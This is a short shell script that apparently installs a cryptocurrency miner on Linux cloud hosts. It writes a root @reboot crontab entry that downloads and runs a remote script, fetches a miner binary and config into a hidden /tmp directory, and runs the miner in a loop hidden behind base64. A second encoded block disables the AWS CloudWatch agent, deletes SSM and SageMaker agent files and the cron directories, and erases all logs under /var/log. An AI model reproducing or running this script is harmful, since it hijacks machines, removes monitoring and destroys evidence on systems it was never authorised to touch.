#!/bin/sh

sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v1.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab


mkdir -p /tmp/.config
wget -qO /tmp/.config/config.json https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/10v.json
wget -qO /tmp/.config/bash https://raw.githubusercontent.com/Blenkinship/any/main/2025
chmod -R 777 /tmp/.config

cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"

/bin/sh -c "echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIHN1ZG8gLi9iYXNoID4vZGV2L251bGwgMj4mMSA7IGRvbmUK' |base64 -d |/bin/bash" &
/bin/sh -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9jb250YWluZXJkIC91c3IvYmluL3NzbS1hZ2VudC13b3JrZXIgL3Vzci9iaW4vYW1hem9uLXNzbS1hZ2VudCAvdXNyL3NiaW4vcm9sZS1hZ2VudCAvdXNyL2xpYmV4ZWMvcG9zdGZpeC9tYXN0ZXIgL29wdC9hd3MvYW1hem9uLWNsb3Vkd2F0Y2gtYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9jbGVhbi1qdXB5dGVyLWxvZyAvZXRjL29wdC9tbC9zY3JpcHRzL3NhZ2VtYWtlci1uYmktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9yZXN0YXJ0LXNhZ2VtYWtlci1hZ2VudC13YXRjaGVyIC9ldGMvb3B0L21sL3NjcmlwdHMvcmVsYXVuY2gtZG9ja2VyLXNlcnZpY2UgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItcm9sZS1wcm94eS1hZ2VudCAvZXRjL29wdC9tbC9zY3JpcHRzL3NldC11cC1hZ2VudC1uYW1lc3BhY2UgL3Vzci9zYmluL3NhbXBsZS1ub3RlYm9va3MtY29uZmlnIC9vcHQvLnNhZ2VtYWtlci9hZGRfY2xvdWRfd2F0Y2hfYWdlbnRfY29uZmlndXJhdGlvbi5weSAvZXRjL2Nyb24uZC8qIC9ldGMvY3Jvbi5kYWlseS8qIC9ldGMvY3Jvbi5ob3VybHkvKjsgc3VkbyBmaW5kIC92YXIvbG9nIC10eXBlIGYgLWRlbGV0ZTsK' |base64 -d |/bin/bash" >/dev/null 2>&1 &

